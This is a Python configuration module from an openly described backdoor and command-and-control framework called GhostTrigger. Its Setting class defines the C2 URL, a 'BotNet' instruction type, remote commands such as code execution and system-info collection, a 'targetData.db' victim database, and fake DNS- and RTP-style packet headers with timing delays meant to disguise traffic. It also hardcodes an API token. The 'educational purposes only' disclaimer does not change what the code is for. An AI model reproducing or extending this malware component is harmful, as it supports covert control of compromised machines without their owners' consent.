"""
GhostTrigger - A backdoor framework for remote control and management of compromised systems.
This code is part of the GhostTrigger project, which is designed to provide a backdoor functionality
for remote access and control over compromised machines. It includes features for command execution,
data retrieval, and system management through a web interface.
This file contains the Setting class, which is responsible for managing application settings,
including paths for logs and database, instruction types, statuses, and network-related configurations.
It also provides utility methods for generating random identifiers.
This code is intended for educational purposes only and should not be used for malicious activities.
Copyright (c) 2023 GhostTrigger(SpecterPanel) Team
Licensed under the GNU General Public License v3.0 (GPL-3.0)
"""

from datetime import datetime
import secrets
import string


class Setting:
    """
    The Setting class is responsible for storing application settings and
    providing utility methods for generating random identifiers,
    and managing configuration paths and database details.
    """

    def setting_var(self):
        """
        Initializes the settings for the application, including paths for
        logs and database, as well as instruction types and statuses.
        This method sets up the necessary configuration for the application
        to function correctly.
        It defines the following attributes:
            - LOG_DIR: Directory path for logs
            - LOG_FILE_NAME: Name of the log file
            - LOG_FILE_PATH: Full path to the log file
            - DB_NAME: Name of the database file
            - DB_DIR: Directory where the database is stored
            - DB_URI: URI for the database connection
            - INSTRACTION: List of instruction types
            - STUTAS: List of statuses for the application
            - BUIT_IN_COMMAND: List of built-in commands
            - API_TOKEN: Token for API authentication
        It also initializes various network-related settings such as:
            - PORT: List of common ports used for various protocols
            - FAKE_HEADERS: List of fake headers for network requests
            - BASE_DELAY: Base delay for network operations
            - MAX_DELAY: Maximum delay for network operations
            - MIN_DELAY: Minimum delay for network operations
            - ADAPTIVE_THRESHOLD: Threshold for adapting delay based on request count
        The method does not return any value but sets up the instance variables
        that can be accessed throughout the application. It is typically called
        during the initialization of the application to ensure that all settings
        are configured before any operations are performed.
        This method does not take any parameters and does not return any value.
        """
        # udp config
        self.PORT = [
            21, # FTP
            22, # SSH
            23, # Telnet
            25, # SMTP
            53, # DNS(UDP)
            80, # HTTP
            110, # POP3
            123, # NTP(UDP)
            143, # IMAP
            161, # SNMP(UDP)
            443, # HTTPS
            445, # SMB
            993, # IMAPS
            995, # POP3S
            3389, # RDP
            5060, # SIP(VoIP)
            8080, # Alternative HTTP
        ]
        self.FAKE_HEADERS = [
            b"\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00",  # DNS-like query
            b"\x80\x00\x00\x00\x00\x01\x00\x00\x00\x00",  # VoIP RTP header
            b"\x00\x00\x00\x00\x00\x00\x00\x00",  # Generic header
        ]
        self.BASE_DELAY = 0.01 
        self.MAX_DELAY = 0.1
        self.MIN_DELAY = 0.05
        self.ADAPTIVE_THRESHOLD = 100 # Number of requests before adapting delay
        # log dir path
        self.LOG_DIR = "utility/log/"
        self.LOG_FILE_NAME = "log.txt"
        self.LOG_FILE_PATH = f"{self.LOG_DIR}{self.LOG_FILE_NAME}"
        # database config
        self.DB_NAME = "targetData.db"
        self.DB_DIR = 'GhostTrigger/db'
        self.DB_URI = f'sqlite:///{self.DB_DIR}/{self.DB_NAME}'
    
        # c2 link
        self.url = 'http://127.0.1:5000'

        # instruction types
        self.INSTRUCTION = ['connectToWeb', 'connectBySocket', 'BotNet']
        self.STATUS = ['Active', 'Inactive']
        # built-in commands
        self.BUILT_IN_COMMAND = ['lib','server','excute_code','sys_info']
        # api token
        self.API_TOKEN = 'GKEGff99ZQo3gR2gCfCaSNCZq5NgvJpe5Byb37mmer8J5FUL4kjkVwuVjfxxghoX0OBREZR7jgweCXuscYKKdeu6bxpyNDsJ65uCmDBN2rap3n5eej3pZPYKR0ROmXkDoA1FWjpCvzPDS3w81fiCMwNxfpqegwMyWvzT5Nr5vlyv7FT9oJKrlVZHutPYuWXbMyss6qWD'

    def ID(self,n=5):
        """
        Generates a random alphanumeric ID of length 5. This ID can be used
        for creating unique identifiers for entities in the system, such as users,
        events, or records.

        Returns:
            str: A randomly generated 5-character string consisting of uppercase letters,
                 lowercase letters, and digits.
        """
        RandomID = ''.join(
            secrets.choice(
                string.ascii_uppercase + string.ascii_lowercase + string.digits
            ) for _ in range(n)
        )
        return RandomID
